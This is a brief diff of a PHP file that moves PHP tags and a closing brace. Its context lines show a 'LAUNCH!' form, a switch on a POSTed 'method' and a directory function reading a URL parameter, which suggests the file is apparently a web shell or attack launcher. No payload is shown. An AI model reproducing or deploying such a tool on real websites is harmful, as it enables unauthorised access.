@@ -664,10 +664,9 @@ switch ($_POST['method']) {
       <input type="submit" name="submit" class="submite" value="LAUNCH!" />
 </form>
 <?php
-?>}
+}?>
 </div></head></body>
-</html>
-<?php
+</html><?php
 #alx.wahid@gmail.com#
 function path() {
 	if(isset($_GET['dir'])) {
